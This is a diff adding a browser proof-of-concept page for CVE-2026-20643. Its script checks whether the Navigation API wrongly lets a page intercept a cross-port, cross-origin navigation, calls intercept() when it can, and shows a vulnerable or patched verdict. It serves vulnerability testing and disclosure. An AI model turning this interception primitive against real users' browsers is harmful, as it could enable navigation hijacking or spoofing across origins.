@@ -1,0 +1,102 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CVE-2026-20643 minimal PoC</title>
+<style>
+  body { font: 14px/1.4 ui-monospace, Menlo, Consolas, monospace; margin: 20px; }
+  button { padding: 8px 12px; font-size: 14px; }
+  pre { background: #111; color: #ddd; padding: 12px; white-space: pre-wrap; min-height: 140px; }
+  #verdict { font-size: 20px; font-weight: bold; margin-top: 12px; padding: 12px; display: none; }
+  #verdict.vuln  { background: #3a0000; color: #ff4444; }
+  #verdict.safe  { background: #003a00; color: #44ff44; }
+</style>
+<h1>CVE-2026-20643 PoC</h1>
+<p>Tests whether <code>NavigateEvent.canIntercept</code> is incorrectly <code>true</code> for cross-port navigations.</p>
+<button id="run" type="button">Run PoC</button>
+<div id="verdict"></div>
+<pre id="out"></pre>
+<script>
+(() => {
+  const out = document.getElementById("out");
+  const verdict = document.getElementById("verdict");
+  const log = (s) => { out.textContent += s + "\n"; };
+
+  function setVerdict(vuln) {
+    verdict.style.display = "block";
+    if (vuln) {
+      verdict.className = "vuln";
+      verdict.textContent = "VULNERABLE — canIntercept=true on cross-origin target (CVE-2026-20643)";
+    } else {
+      verdict.className = "safe";
+      verdict.textContent = "PATCHED — canIntercept=false as expected";
+    }
+  }
+
+  function defaultCrossPortTarget() {
+    const u = new URL(location.href);
+    const port = u.port || (u.protocol === "https:" ? "443" : "80");
+    const other = port === "8800" ? "8000" : "8800";
+    return `${u.protocol}//${u.hostname}:${other}/`;
+  }
+
+  document.getElementById("run").addEventListener("click", () => {
+    out.textContent = "";
+    verdict.style.display = "none";
+
+    if (!window.navigation) {
+      log("Inconclusive: window.navigation unavailable.");
+      return;
+    }
+
+    const target = new URL(defaultCrossPortTarget(), location.href);
+    const crossOrigin = target.origin !== location.origin;
+    log(`from:         ${location.href}`);
+    log(`to:           ${target.href}`);
+    log(`cross-origin: ${crossOrigin}`);
+    log("");
+
+    let hit = false;
+    const onNavigate = (event) => {
+      if (event.destination?.url !== target.href)
+        return;
+      hit = true;
+
+      log(`canIntercept: ${event.canIntercept}`);
+
+      if (crossOrigin && event.canIntercept) {
+        try {
+          event.intercept({
+            handler() {
+              log("intercept() handler ran on cross-origin target");
+            }
+          });
+        } catch (e) {
+          log(`intercept() threw: ${e}`);
+        }
+        setVerdict(true);
+      } else {
+        event.preventDefault();
+        setVerdict(false);
+      }
+    };
+
+    navigation.addEventListener("navigate", onNavigate, { once: true });
+
+    const a = document.createElement("a");
+    a.href = target.href;
+    a.rel = "noreferrer";
+    a.style.display = "none";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+
+    setTimeout(() => {
+      if (!hit) {
+        log("Inconclusive: no matching navigate event observed.");
+      }
+    }, 1200);
+  });
+})();
+</script>
+</html>
